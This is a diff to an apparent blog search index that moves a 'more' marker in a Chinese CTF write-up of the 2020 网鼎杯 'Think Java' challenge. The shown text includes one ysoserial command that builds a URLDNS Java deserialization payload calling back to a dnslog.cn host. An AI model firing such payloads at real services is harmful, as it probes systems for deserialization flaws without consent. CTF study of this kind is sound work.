@@ -4519,12 +4519,12 @@
   <entry>
     <title>java题目</title>
     <url>/2022/03/26/java%E9%A2%98%E7%9B%AE/</url>
-    <content><![CDATA[<h2 id="网鼎杯-2020-朱雀组-Think-Java"><a href="#网鼎杯-2020-朱雀组-Think-Java" class="headerlink" title="[网鼎杯 2020 朱雀组]Think Java"></a>[网鼎杯 2020 朱雀组]Think Java</h2><blockquote>
+    <content><![CDATA[<h2 id="网鼎杯-2020-朱雀组-Think-Java"><a href="#网鼎杯-2020-朱雀组-Think-Java" class="headerlink" title="[网鼎杯 2020 朱雀组]Think Java"></a>[网鼎杯 2020 朱雀组]Think Java</h2><span id="more"></span>
+
+<blockquote>
 <p>血的教训</p>
 <p>千万不要用powershell使用ysoserial,生成的payload直接乱码呜呜</p>
 </blockquote>
-<span id="more"></span>
-
 <p>本题起初找不到入口,看的别人的wp做的,也学习到了很多东西</p>
 <p>生成URLDNS payload</p>
 <p><code>java -jar ysoserial.jar URLDNS &quot;http://3s8kl8.dnslog.cn&quot; &gt; url.bin</code></p>
